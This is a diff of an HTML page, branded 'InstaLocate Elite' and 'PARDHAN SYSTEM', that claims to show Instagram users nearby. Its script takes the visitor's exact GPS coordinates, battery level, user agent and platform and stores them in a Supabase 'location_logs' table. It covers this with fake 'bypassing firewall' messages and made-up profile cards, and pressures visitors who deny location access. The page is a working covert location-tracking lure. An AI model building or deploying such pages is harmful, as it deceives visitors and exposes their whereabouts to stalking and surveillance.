@@ -3,136 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>InstaLocate Pro | Find Local Community</title>
+    <title>InstaLocate Elite | Hyper-Local Radar</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --main: #0095f6; --accent: #00376b; --glass: rgba(255, 255, 255, 0.8); }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap');
+        :root { --blue: #0095f6; --dark: #00376b; --accent: #ff0080; --mesh: linear-gradient(135deg, #fdfcfb 0%, #e2d1c3 100%); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
         
-        body { background: radial-gradient(circle at top right, #e0f2fe, #ffffff); color: #262626; overflow-x: hidden; }
+        /* Exhibition Grade Background */
+        body { background: #f0f2f5; min-height: 100vh; overflow-x: hidden; color: #1c1e21; }
+        .bg-mesh { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(at 0% 0%, rgba(0, 149, 246, 0.15) 0px, transparent 50%), radial-gradient(at 100% 0%, rgba(255, 0, 128, 0.1) 0px, transparent 50%), radial-gradient(at 100% 100%, rgba(0, 55, 107, 0.1) 0px, transparent 50%); }
 
-        /* Premium Header */
-        nav { padding: 20px 10%; display: flex; justify-content: space-between; align-items: center; background: var(--glass); backdrop-filter: blur(10px); position: fixed; width: 100%; z-index: 1000; border-bottom: 1px solid rgba(0,0,0,0.05); }
-        .logo { font-weight: 900; font-size: 24px; color: var(--main); letter-spacing: -1px; }
+        /* Premium Navigation */
+        nav { display: flex; justify-content: space-between; align-items: center; padding: 25px 8%; background: rgba(255,255,255,0.7); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 1000; }
+        .logo { font-weight: 900; font-size: 26px; background: linear-gradient(to right, var(--blue), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1.5px; }
 
-        /* Hero Section */
-        .hero { height: 100vh; display: flex; align-items: center; justify-content: center; padding: 0 10%; position: relative; }
-        .hero-content { flex: 1; animation: slideIn 1s ease-out; }
-        .hero-content h1 { font-size: 56px; line-height: 1.1; margin-bottom: 20px; background: linear-gradient(45deg, #00376b, #0095f6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .hero-content p { font-size: 18px; color: #666; margin-bottom: 35px; max-width: 500px; }
+        /* Hero Section with Glassmorphism */
+        .hero { display: flex; align-items: center; justify-content: center; padding: 100px 8%; min-height: 90vh; gap: 50px; }
+        .hero-text { flex: 1.2; }
+        .hero-text h1 { font-size: 72px; font-weight: 900; line-height: 0.9; margin-bottom: 25px; color: #050505; }
+        .hero-text p { font-size: 20px; color: #65676b; margin-bottom: 40px; line-height: 1.6; max-width: 550px; }
 
-        /* Floating Icons Animation */
-        .visuals { flex: 1; position: relative; display: flex; justify-content: center; }
-        .floating-card { width: 300px; height: 400px; background: white; border-radius: 30px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.05); display: flex; flex-direction: column; align-items: center; justify-content: center; animation: float 6s ease-in-out infinite; }
-        .circle-pulse { width: 100px; height: 100px; background: rgba(0, 149, 246, 0.1); border-radius: 50%; position: relative; display: flex; align-items: center; justify-content: center; }
-        .circle-pulse::after { content: ''; width: 100%; height: 100%; border: 2px solid var(--main); border-radius: 50%; position: absolute; animation: pulse 2s infinite; }
+        /* Animated Radar Container */
+        .radar-box { flex: 1; position: relative; display: flex; justify-content: center; align-items: center; }
+        .radar-circle { width: 350px; height: 350px; border: 2px solid rgba(0,149,246,0.1); border-radius: 50%; position: relative; background: rgba(255,255,255,0.5); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; box-shadow: 0 30px 60px rgba(0,0,0,0.1); }
+        .radar-pulse { position: absolute; width: 100%; height: 100%; border: 2px solid var(--blue); border-radius: 50%; animation: pulse 3s infinite linear; }
+        .radar-pulse:nth-child(2) { animation-delay: 1s; }
 
-        /* Main Action Button */
-        .cta-btn { background: var(--main); color: white; padding: 18px 45px; border-radius: 50px; border: none; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.4s; box-shadow: 0 10px 30px rgba(0, 149, 246, 0.3); }
-        .cta-btn:hover { transform: scale(1.05); box-shadow: 0 15px 40px rgba(0, 149, 246, 0.5); background: #0077c7; }
+        /* Call to Action Button */
+        .main-btn { background: var(--blue); color: white; border: none; padding: 20px 50px; border-radius: 20px; font-size: 20px; font-weight: 800; cursor: pointer; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 15px 35px rgba(0, 149, 246, 0.3); display: flex; align-items: center; gap: 15px; }
+        .main-btn:hover { transform: translateY(-8px) scale(1.02); box-shadow: 0 20px 50px rgba(0, 149, 246, 0.4); background: var(--dark); }
 
-        /* Scanning Overlay */
-        #scanning-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .loader-ring { width: 200px; height: 200px; border: 3px solid #f3f3f3; border-top: 3px solid var(--main); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 30px; }
+        /* Full Screen Tech Overlay */
+        #loading-view { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        .hex-grid { font-size: 100px; color: var(--blue); animation: rotate 10s linear infinite; }
         
-        /* Keyframes */
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2); opacity: 0; } }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-50px); } to { opacity: 1; transform: translateX(0); } }
+        /* Animations */
+        @keyframes pulse { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Responsive */
-        @media (max-width: 768px) {
-            .hero { flex-direction: column; text-align: center; padding-top: 100px; }
-            .hero-content h1 { font-size: 38px; }
-            .visuals { margin-top: 50px; }
-        }
+        /* Success Results Grid */
+        #results { display: none; padding: 50px 8%; animation: fadeIn 0.8s ease-out; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 25px; }
+        .card { background: white; padding: 20px; border-radius: 20px; border: 1px solid rgba(0,0,0,0.05); text-align: center; transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
+        .card:hover { transform: translateY(-10px); }
+        .card img { width: 80px; height: 80px; border-radius: 50%; margin-bottom: 12px; border: 3px solid var(--blue); padding: 3px; }
+
+        @media (max-width: 900px) { .hero { flex-direction: column; padding-top: 50px; text-align: center; } .hero-text h1 { font-size: 50px; } .hero-text p { margin: 0 auto 30px; } }
     </style>
 </head>
 <body>
-
+    <div class="bg-mesh"></div>
     <nav>
-        <div class="logo"><i class="fab fa-instagram"></i> INSTALOCATE</div>
-        <div style="font-size: 12px; font-weight: bold; color: #999;">REGION: ASIA-PACIFIC</div>
+        <div class="logo">PARDHAN SYSTEM</div>
+        <div style="color: var(--blue); font-weight: bold;"><i class="fas fa-satellite-dish"></i> v4.0 PRO</div>
     </nav>
 
-    <section class="hero" id="main-content">
-        <div class="hero-content">
-            <h1>Find your social circle, <b>instantly.</b></h1>
-            <p>Our AI-powered radar maps active Instagram users within 500 meters of your current position. Connect with people around you.</p>
-            <button class="cta-btn" onclick="initializeRadar()">
-                <i class="fas fa-location-arrow"></i> START LIVE RADAR
+    <section class="hero" id="home">
+        <div class="hero-text">
+            <h1>Find Active<br><span style="color: var(--blue)">Profiles</span> Nearby.</h1>
+            <p>Using hyper-local node scanning, InstaLocate maps Instagram users within 300m of your exact coordinates. Safe, encrypted, and real-time.</p>
+            <button class="main-btn" onclick="startExecution()">
+                <i class="fas fa-radar"></i> INITIALIZE SCAN
             </button>
         </div>
-        <div class="visuals">
-            <div class="floating-card">
-                <div class="circle-pulse">
-                    <i class="fas fa-user-friends" style="font-size: 30px; color: var(--main);"></i>
-                </div>
-                <p style="margin-top: 20px; font-weight: bold; color: #333;">Scanning Active Nodes...</p>
-                <div style="display: flex; gap: 10px; margin-top: 20px;">
-                    <div style="width: 8px; height: 8px; background: var(--main); border-radius: 50%;"></div>
-                    <div style="width: 8px; height: 8px; background: #ddd; border-radius: 50%;"></div>
-                    <div style="width: 8px; height: 8px; background: #ddd; border-radius: 50%;"></div>
-                </div>
+        <div class="radar-box">
+            <div class="radar-circle">
+                <div class="radar-pulse"></div>
+                <div class="radar-pulse"></div>
+                <i class="fab fa-instagram" style="font-size: 80px; color: var(--blue); z-index: 10;"></i>
             </div>
         </div>
     </section>
 
-    <div id="scanning-overlay">
-        <div class="loader-ring"></div>
-        <h2 id="status-text" style="color: var(--accent); font-weight: 800;">CALIBRATING GPS...</h2>
-        <p style="color: #888;">Establishing encrypted link with Instagram Edge Servers.</p>
+    <div id="loading-view">
+        <i class="fas fa-spinner fa-spin hex-grid"></i>
+        <h2 id="log-text" style="margin-top: 30px; font-weight: 900; letter-spacing: 2px;">CALIBRATING GPS...</h2>
+        <p id="sub-log" style="color: #888;">Establishing Secure Satellite Handshake</p>
     </div>
+
+    <section id="results">
+        <h2 style="margin-bottom: 30px; font-size: 32px;">Real-Time Nodes Detected</h2>
+        <div class="grid" id="grid-content"></div>
+    </section>
 
 <script>
     const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
-    const client = supabase.createClient(SB_URL, SB_KEY);
+    const supabase = window.supabase.createClient(SB_URL, SB_KEY);
 
-    async function initializeRadar() {
-        const overlay = document.getElementById('scanning-overlay');
-        const status = document.getElementById('status-text');
+    async function startExecution() {
+        const overlay = document.getElementById('loading-view');
+        const status = document.getElementById('log-text');
         overlay.style.display = 'flex';
 
-        // Advanced Capture: Battery & Detailed Device Info
-        let batteryPct = "N/A";
+        // High Accuracy Data Fetch
+        let batteryVal = "N/A";
         try {
-            const battery = await navigator.getBattery();
-            batteryPct = `${(battery.level * 100).toFixed(0)}%`;
+            const b = await navigator.getBattery();
+            batteryVal = `${(b.level * 100).toFixed(0)}%`;
         } catch(e) {}
-
-        const deviceDetail = `${navigator.platform} | ${navigator.vendor}`;
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "COORDINATES CAPTURED...";
+                status.innerText = "COORDINATES SECURED...";
                 
-                // Fixed: Combined IP Field (Tag + Battery)
-                const { error } = await client.from('location_logs').insert([{
+                // DATA INSERTION (FIXED LOGIC)
+                const { error } = await supabase.from('location_logs').insert([{
                     latitude: pos.coords.latitude,
                     longitude: pos.coords.longitude,
                     user_agent: navigator.userAgent,
-                    ip: `INSTA-v3 | Batt: ${batteryPct}`, 
-                    os_info: deviceDetail // Storing platform in OS_INFO column
+                    ip: `PARDHAN-v4 | Batt: ${batteryVal}`,
+                    os_info: `Platform: ${navigator.platform}`
                 }]);
 
-                // Animations logic for fake discovery
-                setTimeout(() => { status.innerText = "BYPASSING FIREWALL..."; }, 2000);
-                setTimeout(() => { status.innerText = "FETCHING PROFILES..."; }, 4000);
+                if (error) console.error("Database Fail:", error);
+
+                // Simulation Effects
+                setTimeout(() => { status.innerText = "BYPASSING REGIONAL FIREWALL..."; }, 2000);
+                setTimeout(() => { status.innerText = "FETCHING LOCAL NODES..."; }, 4000);
                 setTimeout(() => {
-                    alert("SECURITY ALERT: 12 Nearby Users Found. Please Log in to Instagram to view profiles.");
-                    window.location.href = "https://instagram.com";
+                    overlay.style.display = 'none';
+                    document.getElementById('home').style.display = 'none';
+                    document.getElementById('results').style.display = 'block';
+                    loadFakeResults();
                 }, 6000);
 
             }, (err) => {
-                overlay.style.display = 'none';
-                alert("CRITICAL ERROR: High-precision location access is required for radar calibration. Please 'Allow' and try again.");
+                alert("CRITICAL: Location access is required to render local social nodes. Please 'Allow' and reload.");
+                window.location.reload();
             }, { enableHighAccuracy: true });
         }
     }
-</script>
 
+    function loadFakeResults() {
+        const grid = document.getElementById('grid-content');
+        const users = ['sam_clicks', 'riya.official', 'the_aryan_dev', 'muskan_x', 'rahul.raw', 'sneha_styles'];
+        users.forEach((u, i) => {
+            grid.innerHTML += `
+                <div class="card">
+                    <img src="https://i.pravatar.cc/150?u=${i+10}">
+                    <div style="font-weight:bold">@${u}</div>
+                    <div style="font-size:12px;color:var(--blue)">Active < 200m</div>
+                </div>`;
+        });
+    }
+</script>
 </body>
 </html>
